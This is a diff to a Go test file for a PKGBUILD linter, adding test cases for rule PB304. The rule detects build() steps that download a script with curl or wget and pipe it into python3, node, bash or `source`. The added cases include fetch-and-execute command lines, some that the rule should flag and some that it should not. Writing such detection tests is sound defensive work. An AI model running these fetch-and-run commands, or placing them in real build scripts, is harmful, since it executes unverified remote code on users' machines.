@@ -1741,6 +1741,9 @@ build() {
 			"curl -s https://example.com/x | python3 -W ignore -",
 			"curl -s https://example.com/x | python3 -X dev",
 			"wget -qO- https://example.com/x | base64 -d | (sh)",
+			"curl -s https://example.com/x | python3 -uW ignore -",
+			"curl -s https://example.com/x | node --input-type module -",
+			"source /dev/stdin < <(curl -s https://example.com/x)",
 		} {
 			t.Run(line, func(t *testing.T) {
 				expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n"+line+"\n}")})
@@ -1759,6 +1762,10 @@ build() {
 			"bash <<'EOF'\n$(curl -s https://example.com/x)\nEOF",
 			"curl -s https://example.com/x | (cat > out.txt)",
 			`curl -s https://example.com/x >out.txt; bash <<< "echo hi"`,
+			". ./lib.sh < <(curl -s https://example.com/list)",
+			`source ./env.sh <<< "$(curl -s https://example.com/list)"`,
+			`bash < "$(curl -s https://example.com/path)"`,
+			`curl -s https://example.com/v.json | python3 -uW ignore -c "import sys,json; print(json.load(sys.stdin)['v'])"`,
 		} {
 			t.Run(line, func(t *testing.T) {
 				expectNoRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n"+line+"\n}")})
